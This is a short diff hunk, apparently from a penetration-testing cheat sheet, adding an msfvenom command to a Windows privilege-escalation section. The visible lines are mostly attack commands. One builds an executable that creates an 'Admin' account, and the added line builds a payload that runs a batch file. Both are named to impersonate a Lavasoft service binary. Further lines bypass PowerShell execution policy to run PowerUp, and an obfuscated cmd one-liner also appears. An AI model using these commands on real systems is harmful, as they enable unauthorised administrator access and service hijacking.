@@ -68,6 +68,7 @@ cmd /V:ON/C"set Eiz8=d3uc 0v-olCeh\xt.saip1mEO:fn4gMwr/_&&for %n in (3,22,0,16,1
 ```
 ## Add user payload
 `msfvenom -p windows/adduser USER=Admin PASS=Admin123 -f exe -o Lavasoft.WCAssistant.WinService.exe`
+`msfvenom -f exe -p windows/exec CMD="cmd /c C:\Users\ned.flanders_adm/test.bat" -o Lavasoft.WCAssistant.WinService.exe `
 powershell -exec bypass
 import-module .\PowerUp.ps1
 invoke-allchecks
